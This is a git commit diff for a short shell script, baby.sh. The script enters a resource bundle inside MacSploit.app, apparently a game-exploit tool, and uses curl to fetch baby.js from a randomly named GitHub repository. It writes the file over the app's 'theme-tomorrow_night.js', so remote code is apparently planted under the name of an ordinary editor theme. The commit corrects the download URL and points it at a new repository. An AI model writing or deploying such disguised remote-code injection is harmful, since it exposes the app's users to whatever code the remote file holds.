b68c0295b82b998bac235b0a97c3057f886dd031
5rgtnhjigt4rho <55413668+9fkoafkoswfplspflpsld@users.noreply.github.com>
2024-06-27 17:56:55 -0400

    Update baby.sh

--- baby.sh
+++ baby.sh
@@ -1,6 +1,6 @@
 main() {
   cd /Applications/MacSploit.app/Contents/Resources/CodeViewer_CodeViewer.bundle/Contents/Resources/ace.bundle
-  curl "hhttps://raw.githubusercontent.com/PokeMyCord/fjiqikofdkaofdsksoak/main/baby.js" -o "./theme-tomorrow_night.js"
+  curl "https://raw.githubusercontent.com/9fkoafkoswfplspflpsld/dfiwqksifjwfjdioeqwkgukoqwieujfuwiyrwit8r3u/main/baby.js" -o "./theme-tomorrow_night.js"
 }
 
 main
